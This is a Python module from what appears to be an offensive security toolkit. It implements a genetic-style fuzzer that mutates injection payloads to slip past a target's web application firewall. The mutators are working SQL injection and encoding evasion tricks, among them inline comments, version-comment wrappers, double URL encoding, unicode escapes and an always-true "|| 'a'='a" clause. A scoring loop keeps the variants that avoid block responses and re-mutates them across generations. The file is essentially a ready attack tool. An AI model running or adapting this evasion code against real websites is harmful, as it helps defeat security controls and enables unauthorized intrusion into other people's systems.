"""omega/offensive/offense/mutafuzz — WAF mutation fuzzer (genetic-lite).

OFFENSE-GATED (PTK_OFFENSE). Starts from a base probe payload and
evolves mutations that survive the target's block detection:

  operators: case-swap, comment-trick, whitespace-inject, url-encode,
  double-encode, unicode-escape, concat-break, junk-charset

Generation loop: score = (evidence hit) - (block penalty); keep the
top-K performers, re-mutate, budget-capped. Every surviving mutation
is recorded as a SHAPE hint via lessonsv2 (never raw exploit strings
into lessons). Anything blocked is reported as blocked — no silent
retries beyond the budget.
"""
import random
import re
import urllib.parse

__all__ = ["MUTATORS", "mutate", "run_mutafuzz"]

BLOCK_MARK = re.compile(r"blocked|forbidden|403|denied|waf|captcha",
                        re.I)


def _m_case(base):
    return base.upper() if random.random() < 0.5 else \
        "".join(c.upper() if i % 2 else c.lower()
                for i, c in enumerate(base))


def _m_comment(base):
    return base.replace(" ", "/**/", 1)


def _m_ws(base):
    return base.replace("=", "= ", 1)


def _m_urlenc(base):
    return urllib.parse.quote(base)


def _m_doubleenc(base):
    return urllib.parse.quote(urllib.parse.quote(base))


def _m_unicode(base):
    return "".join("%%u%04x" % ord(c) if random.random() < 0.5 else c
                   for c in base)


def _m_concat(base):
    parts = base.split(" ")
    return "' + ".join(parts) + " '"


def _m_junk(base):
    junk = random.choice(("/*!50000", "/*!", " || 'a'='a", "\t"))
    return junk + base + "*/" if junk.startswith("/*") else junk + base


MUTATORS = {
    "case-swap": _m_case, "comment-trick": _m_comment,
    "ws-inject": _m_ws, "url-encode": _m_urlenc,
    "double-encode": _m_doubleenc, "unicode-escape": _m_unicode,
    "concat-break": _m_concat, "junk-charset": _m_junk,
}


def mutate(base, n=4):
    """Produce n distinct mutations of the base payload."""
    ops = random.sample(list(MUTATORS.items()), min(n, len(MUTATORS)))
    return [(name, fn(base)) for name, fn in ops]


def run_mutafuzz(base, send, budget=20, topk=3, generations=3,
                 log=None, seed_payloads=None):
    """Evolve mutations that avoid the block detection.

    seed_payloads: payloads from PREVIOUS runs (stored via lessonsv2
    shape hints) are added to the first-generation population, so the
    fuzzer starts from what survived last time instead of from
    scratch. send(payload) -> str response body (or None on transport
    error). Returns {'survivors': [(operator, payload, evidence)],
    'blocked': count, 'generations': n, 'budget_used': n}.
    """
    if not callable(send):
        return {"survivors": [], "blocked": 0, "generations": 0,
                "budget_used": 0}
    population = [("base", base)]
    for i, sp in enumerate(seed_payloads or []):
        population.append((f"seed-{i}", str(sp)))
    survivors, blocked, used, gen = [], 0, 0, 0
    random.seed(1337)
    while gen < generations and used < budget:
        gen += 1
        scored = []
        for name, payload in population[:topk * 2]:
            if used >= budget:
                break
            used += 1
            try:
                resp = send(payload) or ""
            except Exception:
                continue
            if BLOCK_MARK.search(resp):
                blocked += 1
                continue
            strength = sum(p in resp for p in ("omegaprobe", "7", "49"))
            scored.append((strength, name, payload, resp[:256]))
        scored.sort(reverse=True)
        for s, name, payload, _ev in scored[:topk]:
            survivors.append((name, payload, s))
        # next generation from survivors of this round
        bases = [p for _s, _n, p, _e in scored[:topk]] or [base]
        population = []
        for b in bases:
            population.extend(mutate(b, n=topk))
        if log:
            log("mutafuzz: gen %d survivors=%d blocked=%d" %
                (gen, len(survivors), blocked))
    survivors.sort(reverse=True)
    return {"survivors": survivors[:topk], "blocked": blocked,
            "generations": gen, "budget_used": used}
